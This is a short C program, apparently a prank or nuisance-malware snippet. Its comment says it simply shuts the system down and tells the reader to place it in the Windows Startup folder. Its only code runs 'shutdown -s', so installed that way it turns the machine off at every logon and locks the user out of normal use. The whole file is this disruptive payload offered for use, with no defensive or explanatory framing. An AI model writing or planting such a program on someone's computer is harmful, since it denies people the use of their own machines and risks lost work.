// Simply shuts the system down. 
// Put it in the startup directory (%appdata%\Microsoft\Windows\Start Menu\Programs\Startup)

#include <stdlib.h>

main(){
    system("shutdown -s");
}
